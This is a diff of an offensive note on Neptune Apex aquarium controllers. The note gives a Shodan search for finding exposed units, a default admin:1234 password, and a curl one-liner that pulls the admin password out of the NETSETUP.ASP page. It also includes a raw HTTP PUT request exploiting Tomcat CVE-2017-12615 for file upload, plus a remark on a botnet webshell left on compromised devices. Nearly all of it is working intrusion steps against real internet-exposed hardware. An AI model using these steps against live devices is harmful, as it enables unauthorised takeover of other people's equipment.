@@ -1,8 +1,9 @@
 shodan : html:"apex"  html:"neptune"
+default password  admin:1234
 
  ** Admin Password Leak **
 
-Go to IP/NETSETUP.ASP Check the response / DOM the admin password is inside :)
+Go to IP:PORT/NETSETUP.ASP or IP:PORT/NETSETUP.SHT Check the response / DOM the admin password is inside :)
 You may be able to TELNET into it if its exposed.. but as said in the manual 
 
 "Configure your Apex for external Internet access. Do this up front and Neptune support can
@@ -11,7 +12,7 @@ frequently telnet directly into your controller to help support you."
 
 curl http://IP:PORT/NETSETUP.ASP | grep input | grep admin
 
-** Some instance are vuln to TOMCAT PUT FILE VULN CVE-2017-12615 **
+** Some instances are vuln to TOMCAT PUT FILE VULN CVE-2017-12615 **
 
 ----
 PUT /myfile.asp/ HTTP/1.0
@@ -20,6 +21,9 @@ Connection: close
 
 file content
 ---
+
+funny fact  : some seems to have been spread by https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload but they've upload JSP webshell that won't execute :*)
+you can see the FxCodeShell.jsp shell in the webfolder
 
 ** WEB FILE READ **
 
